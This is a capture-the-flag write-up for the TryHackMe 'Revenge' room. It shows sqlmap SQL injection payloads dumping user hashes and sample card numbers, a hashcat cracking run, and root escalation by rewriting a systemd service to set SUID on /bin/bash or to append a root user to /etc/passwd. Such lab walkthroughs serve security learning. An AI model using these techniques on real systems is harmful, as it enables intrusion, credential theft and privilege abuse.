# Revenge

Revenge - Linux - Medium

https://tryhackme.com/room/revenge


Revenge - Linux - Medium


After checkign website, I thought of using sql injection in /product/:id parameter

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $sqlmap -u 10.10.133.191/products/1 --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:34:43 /2023-06-01/

[02:34:43] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] 
[02:34:45] [INFO] resuming back-end DBMS 'mysql' 
[02:34:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.133.191:80/products/1 AND 1827=1827

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.133.191:80/products/1 AND (SELECT 9179 FROM (SELECT(SLEEP(5)))diYC)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.133.191:80/products/-7380 UNION ALL SELECT 57,57,57,57,57,57,57,CONCAT(0x717a766b71,0x51586278436b714c7742724576774858776e6346544f4c79414c6b576275754d7865665959436551,0x716a626a71)-- -
---
[02:34:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[02:34:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:34:45] [INFO] fetching current database
[02:34:46] [INFO] fetching tables for database: 'duckyinc'
[02:34:46] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[02:34:46] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[02:34:46] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/user/.local/share/sqlmap/output/10.10.133.191/dump/duckyinc/system_user.csv'
[02:34:46] [INFO] fetching columns for table 'user' in database 'duckyinc'
[02:34:47] [INFO] fetching entries for table 'user' in database 'duckyinc'
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[02:34:47] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/user/.local/share/sqlmap/output/10.10.133.191/dump/duckyinc/user.csv'
[02:34:47] [INFO] fetching columns for table 'product' in database 'duckyinc'
[02:34:47] [INFO] fetching entries for table 'product' in database 'duckyinc'
Database: duckyinc
Table: product
[4 entries]
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+

[02:34:47] [INFO] table 'duckyinc.product' dumped to CSV file '/home/user/.local/share/sqlmap/output/10.10.133.191/dump/duckyinc/product.csv'
[02:34:47] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.133.191'


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We got hashes and first flag in DB.
use hashcat or john in order to crack hash of system_user


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $hashcat -a 0 -m 3200 hash.hash /usr/share/wordlists/rockyou.txt -w 3 -O

---
result
---
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:inuyasha
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


ssh into server -> `└──╼ $ssh server-admin@10.10.52.217`

got the flag

server-admin@duckyinc:~$ cat flag2.txt 
thm{4lm0st_th3re}


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.4# sudo -l
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


there are services we have to change service


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
Type=oneshot
#User=oneshot
#Group=www-data
#WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/sh -c "chmod +s /bin/bash"
#ExecStart=/bin/sh -c "echo 'newuser2:$6$eWVCpOLDoESGrkLw$hDN98Ocq.O/w5KFeO9ENu59DaIUdy40SDMw94IsXJdbCwMO2QJak86X6E5D/kQRQP/cjNvAz7DA3Eyev708at/:0:0:root:/root:/bin/bash' >> /etc/passwd"
#ExecReload=/bin/kill -s HUP $MAINPID
#ExecStop=/bin/kill -s TERM $MAINPID
[Install]
WantedBy=multi-user.target
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


we have to change type and comment out everything, we can do with by 2 method

1. Change /bin/bash permissios using `chmod +x /bin/bash`
2. append new user ain /etc/passwd

1st one seems simple, so just change the permission and using `/bin/bash -p` we can login as root
then change index.html from www folder and go to /root, we will get our flag.

Last flag:

```
bash-4.4# cat flag3.txt 
thm{m1ss10n_acc0mpl1sh3d}
```